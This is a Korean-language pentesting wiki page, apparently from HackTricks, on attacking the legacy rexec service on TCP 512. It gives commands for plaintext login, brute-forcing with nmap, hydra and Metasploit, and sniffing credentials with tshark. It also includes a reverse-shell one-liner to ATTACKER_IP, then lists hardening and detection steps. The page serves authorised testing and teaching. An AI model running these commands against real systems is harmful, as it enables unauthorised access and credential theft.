# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

Rexec (원격 **exec**)는 원래 Berkeley *r*-services 스위트 중 하나입니다 ( `rlogin`, `rsh` 등과 함께).  이는 **명확한 텍스트 사용자 이름과 비밀번호로만 인증되는 원격 명령 실행** 기능을 제공합니다.  이 프로토콜은 1980년대 초에 정의되었으며 (RFC 1060 참조) 현재는 **설계상 안전하지 않다고 간주**됩니다.  그럼에도 불구하고 일부 레거시 UNIX / 네트워크 연결 장비에서 기본적으로 활성화되어 있으며, 내부 pentest 중에 가끔 나타납니다.

**기본 포트:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> 🔥 모든 트래픽 – 자격 증명을 포함하여 – **암호화되지 않은** 상태로 전송됩니다. 네트워크를 스니핑할 수 있는 누구나 사용자 이름, 비밀번호 및 명령을 복구할 수 있습니다.

### 프로토콜 간단 개요

1. 클라이언트가 TCP 512에 연결합니다.
2. 클라이언트가 세 개의 **NUL-종료** 문자열을 보냅니다:
* stdout/stderr를 수신하고자 하는 포트 번호(ASCII로) (종종 `0`),
* **사용자 이름**,
* **비밀번호**.
3. 실행할 **명령**이 포함된 최종 NUL-종료 문자열이 전송됩니다.
4. 서버는 단일 8비트 상태 바이트(0 = 성공, `1` = 실패)와 명령 출력을 뒤따라 응답합니다.

즉, `echo -e`와 `nc`만으로 교환을 재현할 수 있습니다:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
유효한 자격 증명이면 동일한 연결에서 `id`의 출력을 바로 받을 수 있습니다.

### 클라이언트를 사용한 수동 사용

많은 리눅스 배포판은 여전히 **inetutils-rexec** / **rsh-client** 패키지 내에 레거시 클라이언트를 포함하고 있습니다:
```bash
rexec -l user -p password <target> "uname -a"
```
`-p`가 생략되면 클라이언트는 비밀번호를 대화식으로 요청합니다(전송 중에 평문으로 표시됨!).

---
## 열거 및 무차별 대입 공격

### [**무차별 대입 공격**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE는 위에서 설명한 프로토콜을 사용하여 자격 증명을 매우 빠르게 시도합니다.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra`는 전용 **rexec** 모듈을 가지고 있으며, 가장 빠른 오프라인 브루트포서로 남아 있습니다. `medusa` (`-M REXEC`)와 `ncrack` (`rexec` 모듈)도 같은 방식으로 사용할 수 있습니다.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
모듈은 성공 시 셸을 생성하고 자격 증명을 데이터베이스에 저장합니다.

---
## 자격 증명 스니핑

모든 것이 평문이기 때문에, **네트워크 캡처는 매우 귀중합니다**. 트래픽의 복사본을 사용하면 대상을 건드리지 않고도 자격 증명을 추출할 수 있습니다:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark에서 *Decode As …​* TCP 512 → REXEC를 활성화하여 잘 정리된 필드를 확인하세요.)

---
## 포스트 익스플로잇 팁

* 제공된 사용자의 권한으로 실행되는 명령어입니다. `/etc/pam.d/rexec`가 잘못 구성된 경우(예: `pam_rootok`), 루트 쉘이 가끔 가능할 수 있습니다.
* Rexec는 사용자의 쉘을 무시하고 `/bin/sh -c <cmd>`를 통해 명령어를 실행합니다. 따라서 여러 명령어를 연결하거나 리버스 쉘을 생성하기 위해 일반적인 쉘 이스케이프 트릭(`;`, ``$( )``, 백틱)을 사용할 수 있습니다:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* 비밀번호는 종종 다른 시스템의 **~/.netrc**에 저장됩니다; 하나의 호스트를 손상시키면 이를 재사용하여 측면 이동을 할 수 있습니다.

---
## 강화 / 탐지

* **rexec를 노출하지 마세요**; SSH로 교체하세요. 사실상 모든 현대 *inetd* 슈퍼서버는 기본적으로 이 서비스를 주석 처리합니다.
* 유지해야 한다면, TCP 래퍼(`/etc/hosts.allow`) 또는 방화벽 규칙으로 접근을 제한하고 강력한 계정별 비밀번호를 시행하세요.
* :512로의 트래픽과 `rexecd` 프로세스 시작을 모니터링하세요. 단일 패킷 캡처로도 손상을 감지할 수 있습니다.
* `rexec`, `rlogin`, `rsh`를 함께 비활성화하세요 – 이들은 대부분 동일한 코드베이스와 취약점을 공유합니다.

---

## 참조

* Nmap NSE `rexec-brute` 문서 – [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit 모듈 `auxiliary/scanner/rservices/rexec_login` – [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
